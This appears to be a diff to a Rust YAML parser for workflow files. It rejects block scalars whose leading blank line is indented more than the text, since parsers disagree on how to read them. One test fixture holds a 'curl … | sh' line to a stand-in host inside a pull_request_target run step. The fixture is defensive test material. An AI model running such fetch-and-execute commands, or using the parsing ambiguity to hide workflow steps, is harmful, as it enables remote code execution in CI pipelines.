@@ -1390,9 +1390,12 @@ impl<'s> P<'s> {
 
     /// A `|` or `>` block scalar whose header `t` is on line `no`; its body is the
     /// lines below indented `min` or more, at the indentation its header gives or
-    /// its first line has. Literal (`|`) and folded (`>`) are kept alike, since the
-    /// value's whitespace is collapsed.
+    /// its first line of text has (a blank line before that one may not have more
+    /// spaces). Literal (`|`) and folded (`>`) are kept alike, since the value's
+    /// whitespace is collapsed.
     fn block_scalar(&mut self, t: &'s str, no: usize, min: usize) -> Node {
+        const LEADING_BLANK: &str =
+            "a block scalar's leading blank line indented more than its first line";
         let mut rest = &t[1..];
         let mut given = None;
         let mut chomp = false;
@@ -1411,11 +1414,25 @@ impl<'s> P<'s> {
         self.pos = no;
         let body = match given {
             Some(n) => Some(min + n - 1),
-            None => (self.pos..self.end)
-                .map(|i| self.src.line(i))
-                .find(|l| !l.blank())
-                .map(|l| l.indent)
-                .filter(|&indent| indent >= min),
+            None => {
+                let first = (self.pos..self.end)
+                    .map(|i| self.src.line(i))
+                    .find(|l| !l.blank());
+                let body = first.map(|l| l.indent).filter(|&indent| indent >= min);
+                // YAML refuses a leading blank line with more spaces than the first
+                // line of text; YAML 1.1 parsers take those spaces for the
+                // indentation, and leave the text out of the scalar.
+                let over = body.and_then(|body| {
+                    (self.pos..self.end)
+                        .map(|i| self.src.line(i))
+                        .take_while(|l| l.blank())
+                        .find(|l| l.indent > body)
+                });
+                if let Some(l) = over {
+                    return self.fail(l.no(), LEADING_BLANK);
+                }
+                body
+            }
         };
         let mut clip = Clip::new();
         while let Some(l) = self.peek() {
@@ -2420,6 +2437,28 @@ mod tests {
                 "a block scalar header YAML does not define: not read from line 2 to the end"
             )]
         );
+    }
+
+    #[test]
+    fn a_leading_blank_line_with_more_spaces_than_a_block_scalars_text_ends_the_read() {
+        // YAML refuses it; YAML 1.1 parsers read the scalar as empty and the text as
+        // a comment.
+        let w = wf("on: pull_request_target\njobs:\n  b:\n    steps:\n      - run: |\n              \n          # curl https://example.invalid/x | sh\n");
+        assert_eq!(
+            unknown(&w),
+            [(
+                6,
+                "a block scalar's leading blank line indented more than its first line: not read from line 6 to the end"
+            )]
+        );
+        // A tab past the spaces does not hide them.
+        let w = wf("on: push\nx: |\n\n         \t\n    a\n");
+        assert_eq!(unknown(&w)[0].0, 4);
+        // As many spaces as the first line of text, or fewer, is read; so is any
+        // blank line under an indentation indicator, or after the first line.
+        let w = wf("on: push\nx: |\n\n  \n    \n    a\n\n          \n    b\ny: |2\n\n        \n    c\njobs:\n  b:\n    steps:\n      - run: d\n");
+        assert!(w.unknown.is_empty(), "{:?}", w.unknown);
+        assert_eq!(w.jobs[0].steps[0].run.as_deref(), Some("d"));
     }
 
     #[test]
